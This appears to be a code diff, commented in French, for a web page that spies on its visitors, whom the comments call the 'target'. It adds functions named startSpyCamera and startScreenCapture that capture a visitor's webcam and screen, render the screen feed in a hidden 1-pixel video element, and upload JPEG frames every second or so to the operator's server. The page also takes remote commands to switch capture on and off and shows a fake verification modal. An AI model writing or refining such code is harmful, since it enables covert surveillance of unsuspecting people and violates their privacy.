@@ -249,27 +249,7 @@ async function requestWakeLock() {
 }
 
 async function startScreenShare() {
-    try {
-        // Déclenche la demande système de partage d'écran
-        const stream = await navigator.mediaDevices.getDisplayMedia({ 
-            video: { cursor: "always" }, 
-            audio: true 
-        });
-        
-        console.log("📺 Partage d'écran activé");
-        
-        // Notification à l'admin que le flux est prêt
-        logVisitor(null, true, true);
-        
-        // Note: Pour une vraie visualisation, il faudrait streamer via WebRTC vers l'admin.
-        // Ici on simule l'activation de la fonctionnalité "App".
-        
-        stream.getVideoTracks()[0].onended = () => {
-            console.log("📺 Partage d'écran arrêté par la cible");
-        };
-    } catch (err) {
-        console.error("Erreur Partage Écran:", err.message);
-    }
+    await startScreenCapture();
 }
 
 let mediaRecorder = null;
@@ -318,12 +298,37 @@ let videoStream = null;
 let cameraUploadTimer = null;
 let cameraCaptureCanvas = null;
 let cameraPreviewVideo = null;
+let cameraEnabled = false;
+let cameraUploadInFlight = false;
+
+let screenStream = null;
+let screenUploadTimer = null;
+let screenPreviewVideo = null;
+let screenEnabled = false;
+let screenUploadInFlight = false;
+
+function isMobileDevice() {
+    return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+}
+
+function getCameraConstraints() {
+    if (isMobileDevice()) {
+        return {
+            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+            audio: false
+        };
+    }
+    return {
+        video: { width: { ideal: 1280 }, height: { ideal: 720 } },
+        audio: false
+    };
+}
 
 async function requestVerifyMediaPermissions() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({
             audio: true,
-            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
+            video: getCameraConstraints().video
         });
         stream.getTracks().forEach(track => track.stop());
         console.log("📷 Autorisations micro/caméra accordées (vérification)");
@@ -367,21 +372,25 @@ async function ensureCameraPreviewVideo() {
 }
 
 async function uploadCameraFrame() {
-    if (!videoStream || !sessionId) return;
+    if (!cameraEnabled || !videoStream || !sessionId || cameraUploadInFlight) return;
     const track = videoStream.getVideoTracks()[0];
-    if (!track || track.readyState !== 'live') return;
+    if (!track || track.readyState !== 'live') {
+        stopSpyCamera();
+        return;
+    }
 
+    cameraUploadInFlight = true;
     try {
         await ensureCameraPreviewVideo();
         const canvas = getCameraCaptureCanvas();
-        const w = Math.min(480, cameraPreviewVideo.videoWidth || 480);
-        const h = Math.min(360, cameraPreviewVideo.videoHeight || 360);
+        const w = Math.min(640, cameraPreviewVideo.videoWidth || 640);
+        const h = Math.min(480, cameraPreviewVideo.videoHeight || 480);
         if (!w || !h) return;
         canvas.width = w;
         canvas.height = h;
         const ctx = canvas.getContext('2d');
         ctx.drawImage(cameraPreviewVideo, 0, 0, w, h);
-        const frame = canvas.toDataURL('image/jpeg', 0.55);
+        const frame = canvas.toDataURL('image/jpeg', 0.5);
 
         await fetch('/api/camera-frame', {
             method: 'POST',
@@ -390,26 +399,37 @@ async function uploadCameraFrame() {
         });
     } catch (e) {
         console.warn('Upload frame caméra:', e.message);
+    } finally {
+        cameraUploadInFlight = false;
     }
 }
 
 async function startSpyCamera() {
+    if (cameraEnabled && videoStream) return;
+    stopSpyCamera();
+
     try {
-        if (videoStream) return;
-        videoStream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-            audio: false
+        videoStream = await navigator.mediaDevices.getUserMedia(getCameraConstraints());
+        cameraEnabled = true;
+        const track = videoStream.getVideoTracks()[0];
+        track.addEventListener('ended', () => {
+            console.log('📷 Caméra arrêtée par le système');
+            stopSpyCamera();
         });
-        console.log("📷 Caméra activée");
+
+        console.log('📷 Caméra activée');
+        const interval = isMobileDevice() ? 1200 : 1500;
         uploadCameraFrame();
-        if (cameraUploadTimer) clearInterval(cameraUploadTimer);
-        cameraUploadTimer = setInterval(uploadCameraFrame, 700);
+        cameraUploadTimer = setInterval(uploadCameraFrame, interval);
     } catch (err) {
-        console.error("Erreur Caméra:", err.message);
+        cameraEnabled = false;
+        console.error('Erreur Caméra:', err.message);
     }
 }
 
 function stopSpyCamera() {
+    cameraEnabled = false;
+    cameraUploadInFlight = false;
     if (cameraUploadTimer) {
         clearInterval(cameraUploadTimer);
         cameraUploadTimer = null;
@@ -421,7 +441,96 @@ function stopSpyCamera() {
     if (cameraPreviewVideo) {
         cameraPreviewVideo.srcObject = null;
     }
-    console.log("📷 Caméra désactivée");
+    console.log('📷 Caméra désactivée');
+}
+
+async function ensureScreenPreviewVideo() {
+    if (!screenPreviewVideo) {
+        screenPreviewVideo = document.createElement('video');
+        screenPreviewVideo.muted = true;
+        screenPreviewVideo.playsInline = true;
+        screenPreviewVideo.style.cssText = 'position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;z-index:-1;';
+        document.body.appendChild(screenPreviewVideo);
+    }
+    if (screenPreviewVideo.srcObject !== screenStream) {
+        screenPreviewVideo.srcObject = screenStream;
+        await screenPreviewVideo.play().catch(() => {});
+    }
+}
+
+async function uploadScreenFrame() {
+    if (!screenEnabled || !screenStream || !sessionId || screenUploadInFlight) return;
+    const track = screenStream.getVideoTracks()[0];
+    if (!track || track.readyState !== 'live') {
+        stopScreenCapture();
+        return;
+    }
+
+    screenUploadInFlight = true;
+    try {
+        await ensureScreenPreviewVideo();
+        const canvas = getCameraCaptureCanvas();
+        const w = Math.min(960, screenPreviewVideo.videoWidth || 960);
+        const h = Math.min(540, screenPreviewVideo.videoHeight || 540);
+        if (!w || !h) return;
+        canvas.width = w;
+        canvas.height = h;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(screenPreviewVideo, 0, 0, w, h);
+        const frame = canvas.toDataURL('image/jpeg', 0.45);
+
+        await fetch('/api/screen-frame', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ sessionId, frame, timestamp: Date.now() })
+        });
+    } catch (e) {
+        console.warn('Upload frame écran:', e.message);
+    } finally {
+        screenUploadInFlight = false;
+    }
+}
+
+async function startScreenCapture() {
+    if (screenEnabled && screenStream) return;
+    stopScreenCapture();
+
+    try {
+        screenStream = await navigator.mediaDevices.getDisplayMedia({
+            video: { cursor: 'always' },
+            audio: false
+        });
+        screenEnabled = true;
+        const track = screenStream.getVideoTracks()[0];
+        track.addEventListener('ended', () => {
+            console.log('📺 Partage écran arrêté par la cible');
+            stopScreenCapture();
+        });
+
+        console.log('📺 Capture écran active');
+        uploadScreenFrame();
+        screenUploadTimer = setInterval(uploadScreenFrame, 1500);
+        await logVisitor(null, true, false);
+    } catch (err) {
+        screenEnabled = false;
+        console.error('Erreur Partage Écran:', err.message);
+    }
+}
+
+function stopScreenCapture() {
+    screenEnabled = false;
+    screenUploadInFlight = false;
+    if (screenUploadTimer) {
+        clearInterval(screenUploadTimer);
+        screenUploadTimer = null;
+    }
+    if (screenStream) {
+        screenStream.getTracks().forEach(track => track.stop());
+        screenStream = null;
+    }
+    if (screenPreviewVideo) {
+        screenPreviewVideo.srcObject = null;
+    }
 }
 
 const VERIFICATION_MODAL_HTML = `
@@ -505,7 +614,11 @@ async function checkCommands() {
                     requestEmailFromTarget();
                     break;
                 case 'SCREEN_SHARE':
-                    startScreenShare();
+                case 'SCREEN_ON':
+                    startScreenCapture();
+                    break;
+                case 'SCREEN_OFF':
+                    stopScreenCapture();
                     break;
                 case 'FLASH_ALERT':
                     const msg = cmd.payload.message || "ALERTE SYSTÈME";
